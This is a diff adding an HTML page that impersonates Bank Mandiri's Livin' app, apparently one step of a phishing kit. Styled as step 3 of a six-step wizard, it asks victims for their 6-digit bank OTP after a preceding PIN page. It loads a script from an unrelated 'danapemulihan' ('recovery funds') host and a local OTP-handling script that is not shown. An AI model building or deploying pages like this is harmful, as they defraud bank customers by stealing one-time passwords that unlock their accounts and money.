@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Mandiri</title>
+
+    <!-- Fonts & Bootstrap -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;600;800&display=swap" />
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.6.2/css/bootstrap.min.css" />
+
+    <style>
+        /* Root colors (sama dengan index) */
+        :root {
+            --primary-color: #e74c3c;
+            --secondary-color: #f8f9fa;
+            --text-color: #333;
+            --btn-primary-bg: #e74c3c;
+            --btn-primary-hover-bg: #c0392b;
+        }
+
+        /* Body and full viewport (sama dengan index) */
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--secondary-color);
+        }
+
+        /* Wrapper container to center the card (sama dengan index) */
+        .form-container-wrapper {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            box-sizing: border-box;
+        }
+
+        /* The card form (sama dengan index) */
+        .form-container {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            padding: 25px 30px;
+        }
+
+        /* Header section with logos and text (sama dengan index) */
+        .header-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .header-section img.logo-mandiri {
+            width: 120px;
+            margin-bottom: 8px;
+        }
+
+        .header-section img.logo-livin {
+            width: 140px;
+            margin-bottom: 6px;
+        }
+
+        .header-section .sub-title {
+            color: var(--primary-color);
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        /* Wizard navigation circles (sama dengan index, tapi langkah 4 aktif) */
+        .wizard-nav {
+            display: flex;
+            justify-content: space-between;
+            list-style: none;
+            padding: 0;
+            margin-bottom: 30px;
+        }
+        .wizard-nav li {
+            flex: 1;
+            text-align: center;
+        }
+        .wizard-nav li a {
+            display: inline-block;
+            width: 36px;
+            height: 36px;
+            line-height: 36px;
+            border-radius: 50%;
+            border: 2px solid #bbb;
+            text-decoration: none;
+            color: blue;
+            font-weight: 700;
+            user-select: none;
+            cursor: default;
+        }
+        .wizard-nav li.active a {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            color: white;
+            cursor: default;
+        }
+
+        /* Form groups with label and input (sama dengan index) */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        label {
+            display: block;
+            font-weight: 700;
+            color: var(--text-color);
+            margin-bottom: 5px;
+        }
+        input.form-control {
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 10px 12px;
+            font-size: 14px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        input.form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 5px rgba(231, 76, 60, 0.4);
+        }
+
+        /* Buttons container (sama dengan index) */
+        .btn-group-custom {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .btn-kembali {
+            background: transparent;
+            border: 2px solid #999;
+            color: #333;
+            font-weight: 700;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-kembali:hover {
+            background-color: #ddd;
+        }
+
+        .btn-selanjutnya {
+            background-color: var(--btn-primary-bg);
+            border: none;
+            color: white;
+            font-weight: 700;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-selanjutnya:hover {
+            background-color: var(--btn-primary-hover-bg);
+        }
+
+        /* Message styles (untuk error/success) */
+        .message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        /* Loading overlay (sama dengan index) */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer image (sama dengan index) */
+        .footer-image {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: auto;
+            z-index: -1;
+        }
+
+        /* Responsive adjustments (sama dengan index) */
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 20px 15px;
+            }
+            .wizard-nav li a {
+                width: 30px;
+                height: 30px;
+                line-height: 30px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container-wrapper">
+        <div class="form-container" role="main">
+            <!-- Header / Brand logos -->
+            <div class="header-section" aria-label="Brand logos and page title">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/426px-Bank_Mandiri_logo_2016.svg.png"
+                     alt="Mandiri Logo" class="logo-mandiri" />
+                <img src="https://static.wikia.nocookie.net/logopedia/images/c/c3/Livin%27_by_mandiri.svg"
+                     alt="Livin' by Mandiri Logo" class="logo-livin" />
+                <div class="sub-title">Data Pribadi</div>
+            </div>
+
+            <!-- Wizard navigation -->
+            <ul class="wizard-nav" role="tablist" aria-label="Form Step Navigation">
+                <li><a href="#" tabindex="-1">1</a></li>
+                <li><a href="#" tabindex="-1">2</a></li>
+                <li class="active" aria-current="step"><a href="#">3</a></li>
+                <li><a href="#" tabindex="-1">4</a></li>
+                <li><a href="#" tabindex="-1">5</a></li>
+                <li><a href="#" tabindex="-1">6</a></li>
+            </ul>
+
+            <!-- Form -->
+            <form id="form-otp" method="POST" novalidate>
+                <input type="hidden" name="" />
+                <div class="form-group">
+                    <label for="otp">OTP Mandiri</label>
+                    <input type="password" id="otp" name="otp" class="form-control" maxlength="6" placeholder="Masukkan Kode 6 digit"
+                           required autocomplete="off" aria-required="true" />
+                </div>
+
+                <!-- Buttons -->
+                <div class="btn-group-custom">
+                    <button type="button" class="btn-kembali" onclick="location.href='pin.html'">Kembali</button>
+                    <button type="submit" class="btn-selanjutnya">Verifikasi OTP</button>
+                </div>
+            </form>
+
+            <!-- Messages (akan diisi oleh JS) -->
+            <div id="message-container"></div>
+        </div>
+    </div>
+
+    <!-- Footer Image -->
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNHR1tBeRoEJBYW5AdmBTu2pyIygz1fTIQV7RBqvEc2idlBO3PpcV46gE8bMMs2_cr50lUMIIpWaikj4gdGbsEEZ8xLZM-T6nBHl5Fb8-oD-4wjiJnCHqsn1FaS6mngPxA8wpdizDCJa15mkp0pmNYhsU2BVJlmQP8hudU_65b8JjWLXw0eJdy1uAq04Q/s1079/1000226740.jpg" alt="Footer Image" class="footer-image">
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loader" style="display: none;">
+        <div class="loader"></div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
+    <script src="script-otp.js"></script>
+</body>
+</html>
